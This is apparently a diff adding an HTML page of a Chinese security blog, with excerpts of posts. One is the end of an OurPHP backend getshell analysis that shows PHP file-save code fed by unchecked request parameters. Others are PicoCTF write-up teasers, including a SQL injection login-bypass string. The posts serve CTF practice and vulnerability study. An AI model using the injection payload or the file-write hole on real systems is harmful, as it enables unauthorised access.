class="variable">$meurl</span>.<span class="string">&quot;?op=edit&amp;fename=&quot;</span>.<span class="variable">$fename</span>.<span class="string">&quot;&amp;folder=&quot;</span>.<span class="variable">$folder</span>.<span class="string">&quot;\&quot;&gt;继续编辑&lt;/a&gt;&lt;/div&gt;\n&quot;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="literal">null</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;span class=&#x27;error&#x27;&gt;文件保存出错！&lt;/span&gt;\n&quot;</span></span><br><span class="line">        .<span class="string">&quot; &lt;a href=\&quot;&quot;</span>.<span class="variable">$meurl</span>.<span class="string">&quot;?op=home&amp;folder=&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;folder&#x27;</span>].<span class="string">&quot;\&quot;&gt;返回文件管理&lt;/a&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">home</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数调用位置:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="variable">$op</span>)&#123;</span><br><span class="line">    ……</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;save&quot;</span>:</span><br><span class="line">    <span class="title function_ invoke__">save</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ncontent&#x27;</span>], <span class="variable">$_REQUEST</span>[<span class="string">&#x27;fename&#x27;</span>], <span class="variable">$_REQUEST</span>[<span class="string">&#x27;encode&#x27;</span>]);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2017/09/18/Ourphp%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/PicoCTF-level1-WriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/09/18/PicoCTF-level1-WriteUp/" class="post-title-link" itemprop="url">PicoCTF Level1 WriteUp</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-09-18 00:00:00" itemprop="dateCreated datePublished" datetime="2017-09-18T00:00:00+08:00">2017-09-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2018-11-01 18:53:24" itemprop="dateModified" datetime="2018-11-01T18:53:24+08:00">2018-11-01</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>在表哥的推荐下接触了PicoCTF，记录一下自己的解题思路</p>
+<h2 id="Tutorial"><a href="#Tutorial" class="headerlink" title="Tutorial"></a>Tutorial</h2><h3 id="Tutorial-1"><a href="#Tutorial-1" class="headerlink" title="Tutorial 1"></a>Tutorial 1</h3><p>给了一个list，找出<code>Robin Morris</code>的中间名，直接搜索，找到<code>Robin Almay Morris</code></p>
+<h3 id="Tutorial-2"><a href="#Tutorial-2" class="headerlink" title="Tutorial 2"></a>Tutorial 2</h3><p>打开链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hey, checkout this super secret message I made, using this cool ROT13</span><br><span class="line">cipher I found online!</span><br><span class="line"></span><br><span class="line">Lb, fb unir lbh orra cynlvat gung arj Zrfbcrgf tnzr? Gubfr arj Zrtnybalpuvqnr naq Oenqlcbqvqnr gurl nqqrq ner cerggl pbby. Npghnyyl, V jbhyq tb nf sne nf fnlvat gung vg vf abj zl yvsr&#x27;f qrnerfg nzovgvba gb bognva n &quot;Vasyngnoyr Fybgu Zbafgre&quot;!</span><br></pre></td></tr></table></figure>
+<p>直接给出了rot13的提示，解密</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2017/09/18/PicoCTF-level1-WriteUp/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/PicoCTF-level2-WriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/09/18/PicoCTF-level2-WriteUp/" class="post-title-link" itemprop="url">PicoCTF Level2 WriteUp</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-09-18 00:00:00" itemprop="dateCreated datePublished" datetime="2017-09-18T00:00:00+08:00">2017-09-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2018-11-01 18:53:20" itemprop="dateModified" datetime="2018-11-01T18:53:20+08:00">2018-11-01</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="My-First-SQL"><a href="#My-First-SQL" class="headerlink" title="My First SQL"></a>My First SQL</h3><p>网页是一个登录界面，尝试万能密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p>成功登陆。</p>
+<p>分析sql查询语句如下<br><code>select * from users where user = &#39;admin&#39; and pass = &#39;&#39;or&#39;1&#39;=&#39;1&#39;;</code></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2017/09/18/PicoCTF-level2-WriteUp/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/PicoCTF-level3-WriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/09/18/PicoCTF-level3-WriteUp/" class="post-title-link" itemprop="url">PicoCTF Level3 WriteUp</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-09-18 00:00:00" itemprop="dateCreated datePublished" datetime="2017-09-18T00:00:00+08:00">2017-09-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2018-11-01 18:53:19" itemprop="dateModified" datetime="2018-11-01T18:53:19+08:00">2018-11-01</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Biscuit"><a href="#Biscuit" class="headerlink" title="Biscuit"></a>Biscuit</h3><p>打开题目，显示<code>Access Denied</code>，还有姜饼人的背景。</p>
+<p>查看源代码，其中有注释。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Storing stuff in the same directory as your web server doesn&#x27;t seem like a good idea --&gt;</span><br><span class="line">&lt;!-- Thankfully, we use a hidden one that is super PRIVATE, to protect our cookies.sqlite file --&gt;</span><br></pre></td></tr></table></figure>
+<p>提示我们去访问&#x2F;private&#x2F;cookies.sqlite文件。</p>
+<p>下载到了cookies.sqlite，sqlite是一种轻型的数据库，要用sqlite3去打开他。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2017/09/18/PicoCTF-level3-WriteUp/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Windylh</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.izilong.net/" title="http:&#x2F;&#x2F;blog.izilong.net&#x2F;" rel="noopener" target="_blank">Zilong's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://p0sec.net/" title="https:&#x2F;&#x2F;p0sec.net&#x2F;" rel="noopener" target="_blank">p0's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://p0desta.com/" title="http:&#x2F;&#x2F;p0desta.com&#x2F;" rel="noopener" target="_blank">p0desta's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://mengsec.com/" title="https:&#x2F;&#x2F;mengsec.com&#x2F;" rel="noopener" target="_blank">Mengchen's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://keysking.github.io/" title="https:&#x2F;&#x2F;keysking.github.io&#x2F;" rel="noopener" target="_blank">Keysking's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://lanvnal.com/" title="http:&#x2F;&#x2F;lanvnal.com&#x2F;" rel="noopener" target="_blank">LANVNAL's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://0sec.com.cn/" title="http:&#x2F;&#x2F;0sec.com.cn&#x2F;" rel="noopener" target="_blank">Fazx's blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Windylh</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
